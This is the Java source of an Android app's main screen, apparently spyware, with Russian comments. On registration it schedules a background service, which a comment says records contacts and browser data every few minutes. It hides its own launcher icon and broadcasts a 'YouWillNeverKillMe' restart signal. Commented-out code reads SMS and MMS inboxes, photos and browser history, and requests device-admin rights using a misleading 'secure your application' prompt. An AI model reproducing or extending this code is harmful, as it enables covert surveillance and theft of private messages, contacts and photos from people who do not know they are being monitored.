package com.postal.omniscient;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v7.app.AppCompatActivity;

import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.catchPhone.Call.DeviceAdminDemo;
import com.postal.omniscient.postal.catchPhone.Call.PhoneCall;
import com.postal.omniscient.postal.catchPhone.Call.TService;
import com.postal.omniscient.postal.reader.contact.ReadContacts;
import com.postal.omniscient.postal.reader.mms.ReadMms;
import com.postal.omniscient.postal.reader.sms.ReadSms;
import com.postal.omniscient.postal.reader.image.AllImages;
import com.postal.omniscient.postal.service.AlarmReceiver;
import com.postal.omniscient.postal.service.MyService;
import com.postal.omniscient.postal.service.RestartServiceReceiver;
import com.postal.omniscient.postal.service.StartService;

import org.greenrobot.eventbus.EventBus;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.CookieHandler;
import java.net.CookiePolicy;
import java.text.SimpleDateFormat;
import java.util.Calendar;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private static String Msg = "MyMsg1";
    final int SDK_INT = Build.VERSION.SDK_INT;
    private static final int REQUEST_CODE = 0;
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    private Button registration, cookie;
    private EditText userID;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        registration = (Button)findViewById(R.id.registration);
        cookie = (Button)findViewById(R.id.cookie);
        userID = (EditText) findViewById(R.id.userID);
        registration.setOnClickListener(this);
        cookie.setOnClickListener(this);


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (REQUEST_CODE == requestCode) {
//            Intent intent = new Intent(MainActivity.this, TService.class);
//            startService(intent);
        }
    }


    private void startAPP(){
        if(userID.getText().length()<1){
            Toast toast = Toast.makeText(getApplicationContext(),
                    "Enter your code", Toast.LENGTH_LONG);
            toast.show();
            return;
        }
        saveLogin();
        //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
        //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent myIntent = new Intent(MainActivity.this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, myIntent, 0);
        if (SDK_INT < Build.VERSION_CODES.KITKAT) {
            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
        }
        else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
        }
        else if (SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
        }

        PackageManager pkg=this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);// ЕТО ВКЛЮЧИТЬ


//        PackageManager p = getPackageManager();
//        ComponentName componentName = new ComponentName(this,MainActivity.class);
//        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        //CONTACTS
//        getContacts();//in test
        //SMS
//        ReadSms ob = new ReadSms(getContentResolver());
//        String uri_send_sms = "content://sms/sent";
//        String uri_inbox_sms = "content://sms/inbox";
//        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki



        //IMEGE
//        AllImages img = new AllImages(getContentResolver());
//        String DATE_COLUMN_NAME = "date_added > ? AND ?";
//        Calendar currentDate = Calendar.getInstance();
//
//        long start_date = 1453734849;// дата из БД последней удачной передачи данных
//        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр

//        img.getAllImages(DATE_COLUMN_NAME, start_date, end_date); //для выборки по дате новых фото
//        img.getAllImages();

        //BROWSER
//        BrowserHistory br_h = new BrowserHistory(getContentResolver());
//        br_h.getBrowserHist();

        //MMS
       // ReadMms mms = new ReadMms(getContentResolver());
//        Long buf_date;
//        for(AdapterData buf : mms.massAllMms()){
//            Log.i(Msg, "Id : "+buf.getId());
//            Log.i(Msg, "Phone : "+buf.getAddress());
//            Log.i(Msg, "Text : "+buf.getMsg());
//            buf_date = Long.parseLong(buf.getTime());
//            Log.i(Msg, "date : " + new SimpleDateFormat("dd/MM/yyyy HH:mm")
//                    .format(buf_date*1000));
//        } 
//

//        PhoneCall phoneCall = new PhoneCall();
//        phoneCall.onReceive(getApplicationContext(),null);
        //////////////////////////////////////////////////////////////////
//
//        try {
//            // Initiate DevicePolicyManager.
//            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//            mAdminName = new ComponentName(this, DeviceAdminDemo.class);
//
//            if (!mDPM.isAdminActive(mAdminName)) {
//                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
//                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
//                startActivityForResult(intent, REQUEST_CODE);
//            } else {
////                 mDPM.lockNow();
////                 Intent intent = new Intent(MainActivity.this,
////                 TrackDeviceService.class);
////                 startService(intent);
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
////////////////////////////////////////////////////////////////////////////
//        ReadMms mms = new ReadMms(getContentResolver());
//        String uri_send_mms = "content://mms";
//        String uri_inbox_mms = "content://mms/inbox";
//        mms.massAllMms();
//        mms.massAllMMS(uri_send_sms, uri_inbox_sms);
        ///////////////////////////////////////////
        //STRAT SERVICE
//        Toast toast = Toast.makeText(getApplicationContext(),
//                "Пора покормить кота!", Toast.LENGTH_SHORT);
//        AsyncM ad = new AsyncM(getApplicationContext(), toast);

        //ad.forceLoad();

//        Intent par = new Intent(getApplicationContext(), StartService.class);
        sendBroadcast(new Intent("YouWillNeverKillMe"));
        finish(); //ЕТО ВКЛЮЧИТЬ
            }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.registration:startAPP();break;
            case R.id.cookie:dispatchTakePictureIntent();break;
        }
    }

    private void dispatchTakePictureIntent() {
        final int REQUEST_IMAGE_CAPTURE = 1;

        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
            startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
        }
    }
    // save id_user
    private void saveLogin(){
        writeFromFile(getApplicationContext(), "super");
    }

    private void writeFromFile(Context context, String data) {

        try {
            File stPath = new File(context.getFilesDir(), "/Config");//DIR);
            // создаем каталог
            if (!stPath.exists()) {
                stPath.mkdirs();
            }
            File file = new File(stPath, "config.cnf");
            FileOutputStream f = new FileOutputStream(file);
            PrintWriter pw = new PrintWriter(f);
            pw.println(userID.getText().toString());

            pw.flush();
            pw.close();
            f.close();
        }
        catch (IOException e) {
            Log.e("Exception", "File write failed: " + e.toString());
        }

    }


    public class AsyncM extends AsyncTaskLoader {


        public AsyncM(Context context) {
            super(context);

        }
        Toast toast;
        public AsyncM(Context applicationContext, Toast toast) {
            super(applicationContext);
            this.toast = toast;
        }

        @Override
        public Object loadInBackground() {
            Log.i("MyMsg", "MyActyvity Start");
            Intent par = new Intent(getApplicationContext(), StartService.class);
            startService(par);

            return null;
        }
    }
}
